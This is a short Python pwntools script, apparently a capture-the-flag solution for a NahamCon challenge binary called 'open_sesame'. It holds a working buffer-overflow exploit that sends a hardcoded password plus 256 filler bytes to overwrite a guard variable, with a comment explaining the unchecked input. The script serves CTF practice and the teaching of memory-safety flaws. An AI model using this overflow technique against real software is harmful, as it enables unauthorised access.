#!/usr/bin/python3

from pwn import *

p = process("./open_sesame")
#p = remote("challenge.nahamcon.com", 32743)

"""
the program waits for the user input and stores it in a 256 buffer,
always prints an error message because caveCanOpen variable is always false,
input size is not sanitized, so we can create a bufferoverlow to overwrite the caveCanOpen variable,
the next step is the password comparation, that takes the first 13 bytes of our buffer (secret_pass length)
and compares with the hardcoded secret pass. so the explotation is as simple has set the sectet pass at the start,
and write enought memory to overwrite the caveCanOpen variable.
"""

buff = "A" * 256
secret_pass = "OpenSesame!!!"

p.recvuntil(b"What is the magic enchantment that opens the mouth of the cave?")
p.sendline(str.encode(secret_pass + buff))

print(p.recvall())